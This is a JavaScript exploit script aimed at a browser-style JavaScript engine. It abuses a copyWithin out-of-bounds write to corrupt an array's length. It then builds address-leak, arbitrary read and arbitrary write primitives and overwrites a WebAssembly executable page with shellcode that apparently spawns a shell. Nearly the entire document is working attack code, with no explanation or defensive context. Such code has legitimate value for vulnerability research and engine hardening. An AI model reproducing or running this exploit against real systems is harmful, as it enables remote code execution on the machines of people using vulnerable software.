var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

function hprint(val) {
	console.log("0x"+val.toString(16));
}

function gc() {
	for (let i = 0; i < 100; i++) {
		new ArrayBuffer(0x100000);
	}
}

function trigger() {
	var arr = new Uint8Array(8);
	var normal_arr = [1.1];
	var object = {};
	var object_arr = [object];
	arr[0] = 0 ;
	arr[1] = 1 ;
	arr[2] = 2 ;
	arr[3] = 3 ;
	arr[4] = 4 ; 
	arr[5] = 5 ;
	arr[6] = 6 ;
	arr[7] = 7 ;
	arr.copyWithin(5,1,2,8); //bug element size migrates to 8 byte value leading to OOB write.
	console.log(arr.length);
	hprint(arr[104]);
	arr[104] = 0xf8;
	console.log(normal_arr.length);
	return normal_arr;
}

gc();
var corrupted_array = trigger();
var obj_arr = [{},{}];
var oob_array = [1.1,2.2,3.3];
if(corrupted_array.length != 0xf8/2) {
	throw new Error("Failed");
}
let float_arr_map = ftoi(corrupted_array[1])&0xffffffffn;
let float_arr_properties = (ftoi(corrupted_array[1])&0xffffffff00000000n) >> ( 32n );
let obj_arr_map = (ftoi(corrupted_array[24])&0xffffffff00000000n) >> ( 32n );
let obj_arr_properties = ftoi(corrupted_array[25])&0xffffffffn;
let fake_addrof_map = ( float_arr_map << 32n ) + ( ftoi(corrupted_array[24])&0xffffffffn );
let fake_addrof_properties_intact = ( ftoi(corrupted_array[25])&0xffffffff00000000n ) + ( float_arr_properties ) 

function addrof(object) {
	obj_arr[0] = object;
	corrupted_array[24] = itof(fake_addrof_map);
	corrupted_array[25] = itof(fake_addrof_properties_intact);
	let addr = ftoi(obj_arr[0]);
	corrupted_array[24] = itof( (obj_arr_map << 32n ) + (ftoi(corrupted_array[24])&0xffffffffn) )
	corrupted_array[25] = itof( (ftoi(corrupted_array[25])&0xffffffff00000000n) + (obj_arr_properties) )
	return addr;
}

function arbread(address) {
	corrupted_array[32] = itof(address);
	return ftoi(oob_array[0]);
}

function arbwrite(address,what) {
	corrupted_array[32] = itof(address);
	oob_array[0] = itof(what);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

let wasm_addr = addrof(wasm_instance);
let rwx_page = arbread(wasm_addr+0x60n);
hprint(rwx_page);
hprint(wasm_addr);

let buff = new ArrayBuffer(0x100);
let dataview = new DataView(buff);
let buff_addr = addrof(buff);
let backing_store_buf_addr = buff_addr + 0xcn;
arbwrite(backing_store_buf_addr,rwx_page);
let shellcode = [0xfe58426a, 0x529948c4, 0x622fbf48, 0x2f2f6e69, 0x54576873 ,0xd089495e, 0x0fd28949, 0x5];

for (let i = 0; i < shellcode.length ; i++) {
	dataview.setUint32(4*i,shellcode[i],true);
}
//%SystemBreak();
f();
